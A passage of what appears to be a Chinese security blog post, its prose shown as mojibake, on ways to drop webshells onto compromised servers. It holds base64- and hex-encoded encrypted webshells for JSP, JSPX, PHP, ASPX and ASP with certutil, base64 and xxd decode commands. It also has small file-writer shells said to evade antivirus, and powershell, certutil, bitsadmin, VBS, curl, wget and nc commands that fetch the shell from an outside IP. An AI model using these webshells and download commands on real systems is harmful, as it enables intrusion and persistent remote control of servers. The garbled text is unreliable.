å°é©¬æˆ–è€…å¤§é©¬å­˜åœ¨å„ç§ç‰¹æ®Šå­—ç¬¦éœ€è¦è½¬ä¹‰è¾“å‡ºæ–‡ä»¶ä¸­å†…å®¹å„ç§æŠ¥é”™ä¸è§£æç­‰ç­‰<br>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>base64</code>ç¼–ç å†è§£ç è¾“å‡ºåˆ°æ–‡ä»¶ï¼Œå®Œç¾è§£å†³è½¬ä¹‰é—®é¢˜<br>è¯­å¥å¦‚ä¸‹ï¼š</p><p><strong>ï¼ˆaï¼‰Windows</strong></p><p>åœ¨windowsä¸­è½¬æ¢æ–¹æ³•ï¼Œæ˜¯é€šè¿‡certutilè¿›è¡Œè½¬æ¢ã€‚ä¸‹é¢æ˜¯base64ä»¥åŠhexçš„è½¬æ¢æ–¹å¼ï¼Œæ²¡æœ‰åˆ—å‡ºå†°èå„è¯­è¨€shellï¼Œè¡¨å“¥ä»¬è‡ªå·±æ•´ç†å§ã€‚</p><p><strong>ï¼ˆ1ï¼‰certutil-Base64</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= &gt; 111.txt</span><br><span class="line">certutil -f -decode 111.txt C:\\111.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰certutil-Hex</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e &gt; 111.txt</span><br><span class="line"></span><br><span class="line">certutil -decodehex 111.txt C:\\111.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆbï¼‰Linux</strong></p><p>å’Œwindowsä¸åŒï¼Œlinuxåœ¨é€”ä¸­å°±å·²ç»è½¬æ¢å®Œæ¯•ï¼Œè½åœ°æ–‡ä»¶å·²ç»æˆä¸ºshellã€‚å¤§éƒ¨åˆ†ç©å®¶éƒ½æ˜¯æ‡’å¾—è½¬ä¹‰shellä¸­çš„å­—ç¬¦ï¼Œè€Œä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•ã€‚ä¸»è¦ä¹Ÿæ˜¯åˆ†base64ä»¥åŠhexä¸¤ç§ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo base64åçš„æœ¨é©¬å†…å®¹ |base64 -d &gt; 360.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ1ï¼‰jsp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= |base64 -d &gt; 111.jsp</span><br><span class="line"></span><br><span class="line">echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e|xxd -r -ps &gt; 111.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰jspx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+IGNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD5TdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYygoc2Vzc2lvbi5nZXRWYWx1ZSgidSIpKyIiKS5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7PC9qc3A6c2NyaXB0bGV0PjwvanNwOnJvb3Q+|base64 -d &gt; 111.jsp</span><br><span class="line"></span><br><span class="line">echo 3c6a73703a726f6f7420786d6c6e733a6a73703d22687474703a2f2f6a6176612e73756e2e636f6d2f4a53502f50616765222076657273696f6e3d22312e32223e3c6a73703a6469726563746976652e7061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a222f3e3c6a73703a6465636c61726174696f6e3e20636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d3c2f6a73703a6465636c61726174696f6e3e3c6a73703a7363726970746c65743e537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563282873657373696f6e2e67657456616c756528227522292b2222292e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b3c2f6a73703a7363726970746c65743e3c2f6a73703a726f6f743e|xxd -r -ps &gt; 111.jspx</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰php</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTtzZXNzaW9uX3N0YXJ0KCk7JGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7JF9TRVNTSU9OWydrJ109JGtleTtzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7JHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7aWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSl7JHQ9ImJhc2U2NF8iLiJkZWNvZGUiOyRwb3N0PSR0KCRwb3N0LiIiKTtmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHskcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgfX1lbHNleyRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpO30kYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTskZnVuYz0kYXJyWzBdOyRwYXJhbXM9JGFyclsxXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCkge2V2YWwoJHAuIiIpO319QGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Pz4K|base64 -d &gt; 111.php</span><br><span class="line"></span><br><span class="line">echo 3c3f70687020406572726f725f7265706f7274696e672830293b73657373696f6e5f737461727428293b246b65793d2265343565333239666562356439323562223b245f53455353494f4e5b276b275d3d246b65793b73657373696f6e5f77726974655f636c6f736528293b24706f73743d66696c655f6765745f636f6e74656e747328227068703a2f2f696e70757422293b69662821657874656e73696f6e5f6c6f6164656428276f70656e73736c2729297b24743d226261736536345f222e226465636f6465223b24706f73743d24742824706f73742e2222293b666f722824693d303b24693c7374726c656e2824706f7374293b24692b2b29207b24706f73745b24695d203d2024706f73745b24695d5e246b65795b24692b312631355d3b207d7d656c73657b24706f73743d6f70656e73736c5f646563727970742824706f73742c2022414553313238222c20246b6579293b7d246172723d6578706c6f646528277c272c24706f7374293b2466756e633d246172725b305d3b24706172616d733d246172725b315d3b636c61737320437b7075626c69632066756e6374696f6e205f5f696e766f6b6528247029207b6576616c2824702e2222293b7d7d4063616c6c5f757365725f66756e63286e6577204328292c24706172616d73293b3f3ea|xxd -r -ps &gt; 111.php</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ4ï¼‰aspx</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlQEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5SZWZsZWN0aW9uIiU+PCVTZXNzaW9uLkFkZCgiayIsImU0NWUzMjlmZWI1ZDkyNWIiKTtieXRlW10gayA9IEVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoU2Vzc2lvblswXSArICIiKSxjID0gUmVxdWVzdC5CaW5hcnlSZWFkKFJlcXVlc3QuQ29udGVudExlbmd0aCk7QXNzZW1ibHkuTG9hZChuZXcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQoKS5DcmVhdGVEZWNyeXB0b3IoaywgaykuVHJhbnNmb3JtRmluYWxCbG9jayhjLCAwLCBjLkxlbmd0aCkpLkNyZWF0ZUluc3RhbmNlKCJVIikuRXF1YWxzKHRoaXMpOyU+|base64 -d &gt; 111.aspx</span><br><span class="line"></span><br><span class="line">echo 3c25402050616765204c616e67756167653d2243232220253e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22253e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b253e|xxd -r -ps &gt; 111.aspx</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ5ï¼‰asp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo PCUKUmVzcG9uc2UuQ2hhclNldCA9ICJVVEYtOCIgCms9ImU0NWUzMjlmZWI1ZDkyNWIiClNlc3Npb24oImsiKT1rCnNpemU9UmVxdWVzdC5Ub3RhbEJ5dGVzCmNvbnRlbnQ9UmVxdWVzdC5CaW5hcnlSZWFkKHNpemUpCkZvciBpPTEgVG8gc2l6ZQpyZXN1bHQ9cmVzdWx0JkNocihhc2NiKG1pZGIoY29udGVudCxpLDEpKSBYb3IgQXNjKE1pZChrLChpIGFuZCAxNSkrMSwxKSkpCk5leHQKZXhlY3V0ZShyZXN1bHQpCiU+|base64 -d &gt; 111.asp</span><br></pre></td></tr></table></figure><h3 id="3-äºŒæ¬¡æ³•"><a href="#3-äºŒæ¬¡æ³•" class="headerlink" title="3.äºŒæ¬¡æ³•"></a>3.äºŒæ¬¡æ³•</h3><p>å¯¹äºäºŒæ¬¡æ³•ï¼Œå°±æ˜¯å…ˆä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„å°â€œshellâ€,ç„¶åé€šè¿‡æŒ‡å®šæ–¹å¼è¿›è¡Œä¸Šä¼ å…¶ä»–æ–‡ä»¶ã€‚æœ‰ä¸€ä¸ªå¥½å¤„å°±æ˜¯ï¼Œå®ƒæœ¬èº«ä¸æ˜¯æœ¨é©¬ç—…æ¯’ï¼Œå°±æ˜¯ä¸€ä¸ªå†™å…¥æ–‡ä»¶çš„åŠŸèƒ½è„šæœ¬ï¼Œæ‰€ä»¥ä¸€èˆ¬æ€æ¯’ä¸ä¼šæ€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥éšæ„ä¸Šä¼ äº†ã€‚</p><p><strong>ï¼ˆaï¼‰JSP</strong></p><p>GETç±»å‹</p><p><strong>ï¼ˆ1ï¼‰god.jspå†…å®¹ ï¼ˆå…ˆé£éƒ¨é˜Ÿï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%if(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());%&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰å†™jsp shell</strong></p><p>getç±»å‹å†™shelléœ€è¦æ³¨æ„urlç¼–ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/god.jsp?f=111.jsp&amp;t=&lt;%25@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%25&gt;&lt;%25!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%25&gt;&lt;%25if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%25&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰å†™jspx shell</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/god.jsp?f=111.jspx&amp;t=&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)%2B&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure><p>POSTç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=â€javaâ€ pageEncoding=â€gbkâ€%&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:directive.page import=&quot;java.io.File&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:directive.page import=&quot;java.io.OutputStream&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:directive.page import=&quot;java.io.FileOutputStream&quot;/&gt;</span><br><span class="line">&lt;% int i=0;String method=request.getParameter(â€œactâ€);if(method!=null&amp;&amp;method.equals(â€œyocoâ€))&#123;String url=request.getParameter(â€œurlâ€);String text=request.getParameter(â€œsmartâ€);File f=new File(url);if(f.exists())&#123;f.delete();&#125;try&#123;OutputStream o=new FileOutputStream(f);o.write(text.getBytes());o.close();&#125;catch(Exception e)&#123;i++;%&gt;</span><br><span class="line">error</span><br><span class="line">&lt;%&#125;&#125;if(i==0)&#123;%&gt;</span><br><span class="line">ok</span><br><span class="line">&lt;%&#125;%&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=&apos;?act=yoco&apos; method=&apos;post&apos;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input size=&quot;100&quot; value=&quot;&lt;%=application.getRealPath(&quot;/&quot;) %&gt;&quot; name=&quot;url&quot;&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">&lt;textarea rows=&quot;20&quot; cols=&quot;80&quot; name=&quot;smart&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆbï¼‰PHP</strong></p><p>GETç±»å‹</p><p><strong>ï¼ˆ1ï¼‰god.phpå†…å®¹ ï¼ˆå…ˆé£éƒ¨é˜Ÿï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fwrite(fopen($_GET[&apos;filename&apos;], &quot;w&quot;), $_GET[&apos;content&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰å†™php shell</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/god.php?filename=111.php&amp;content=&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&apos;k&apos;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&apos;openssl&apos;))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i%2B%2B) &#123;$post[$i] = $post[$i]^$key[$i%2B1%2615]; &#125;&#125;else&#123;$post=openssl_decrypt($post, &quot;AES128&quot;, $key);&#125;$arr=explode(&apos;|&apos;,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt;</span><br></pre></td></tr></table></figure><p>POSTç±»å‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;Filename:&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;filename&quot;&gt;&lt;br /&gt;Content:&lt;br /&gt;&lt;textarea rows=&quot;20&quot; cols=&quot;80&quot; name=&quot;content&quot;&gt;&lt;?php fwrite(fopen($_POST[&apos;filename&apos;], &quot;w&quot;), $_POST[&apos;content&apos;]);?&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆcï¼‰ASPX</strong></p><p>å¯¹äºaspxæ¥è¯´ï¼Œæ­¤åŠŸèƒ½å¯èƒ½æ¯”è¾ƒé¸¡è‚‹ï¼Œå› ä¸ºaspxå†™æ–‡ä»¶éœ€è¦ä¸€å®šæƒé™ã€‚</p><p>GETç±»å‹</p><p><strong>ï¼ˆ1ï¼‰god.aspxå†…å®¹ ï¼ˆå…ˆé£éƒ¨é˜Ÿï¼‰</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;% System.IO.File.WriteAllText(System.AppDomain.CurrentDomain.BaseDirectory+&quot;\\&quot;+Request.QueryString[&quot;filename&quot;], Request.QueryString[&quot;content&quot;]);%&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰å†™aspx shell</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://host/god.aspx?filename=god.aspx&amp;content=&lt;%@ Page Language=&quot;C%23&quot; %&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%Session.Add(&quot;k&quot;,&quot;e45e329feb5d925b&quot;);byte[] k = Encoding.Default.GetBytes(Session[0] %2B &quot;&quot;),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(&quot;U&quot;).Equals(this);%&gt;</span><br></pre></td></tr></table></figure><h3 id="4-è¿œç¨‹ä¸‹è½½æ³•"><a href="#4-è¿œç¨‹ä¸‹è½½æ³•" class="headerlink" title="4.è¿œç¨‹ä¸‹è½½æ³•"></a>4.è¿œç¨‹ä¸‹è½½æ³•</h3><p>è¿œç¨‹ä¸‹è½½æ³•ï¼Œå¸¸ç”¨äºï¼Œå¯ä»¥é€šå¤–ç½‘çš„æˆ˜æ³•ã€‚è¿™é‡Œåªæ€»ç»“äº†éƒ¨åˆ†ã€‚åƒftpä¹‹ç±»çš„æ²¡æœ‰æ€»ç»“ã€‚</p><p><strong>ï¼ˆaï¼‰Windows</strong></p><p><strong>ï¼ˆ1ï¼‰powershell</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(&apos;http://101.32.185.60:8080/111.jsp&apos;,&apos;C:\\Windows\\2.jsp&apos;)</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰certutil</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f http://101.32.185.60:8080/111.jsp C:\\Windows\\3.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰bitsadmin</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://101.32.185.60:8080/111.jsp C:\\Windows\\1.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ4ï¼‰vbs</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;):Set Shell = CreateObject(&quot;Wscript.Shell&quot;):Set aGet = CreateObject(&quot;ADODB.Stream&quot;):Post.Open &quot;GET&quot;,&quot;http://101.32.185.60:8080/111.jsp&quot;,0:Post.Send():aGet.Mode = 3:aGet.Type = 1:aGet.Open():aGet.Write(Post.responseBody):aGet.SaveToFile &quot;C:\333.jsp&quot;,2 &gt; 111.vbs&amp;111.vbs</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆbï¼‰Linux</strong></p><p><strong>ï¼ˆ1ï¼‰curl</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://101.32.185.60:8080/111.jsp -o /root/3.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ2ï¼‰wget</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://101.32.185.60:8080/111.jsp -o /root/3.jsp</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰nc</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -l 9992 &lt;111.jsp #vpsæ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">nc 101.32.185.60 9992 &gt;222.jsp #ç›®æ ‡æœºå™¨æ‰§è¡Œ</span><br></pre></td></tr></table></figure><p>ä¸€èµ·ç ”ç©¶ï¼Œå…±åŒè¿›æ­¥ã€‚<br>å¤§ä½¬è½»å–·ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://www.freebuf.com/articles/web/201013.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/201013.html</a><br><a href="https://wiki.silic.wiki/å·¥å…·åˆ†äº«:è¶…ç²¾ç®€jspä¸Šä¼ å°é©¬" target="_blank" rel="noopener">https://wiki.silic.wiki/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB:%E8%B6%85%E7%B2%BE%E7%AE%80jsp%E4%B8%8A%E4%BC%A0%E5%B0%8F%E9%A9%AC</a></p><h3 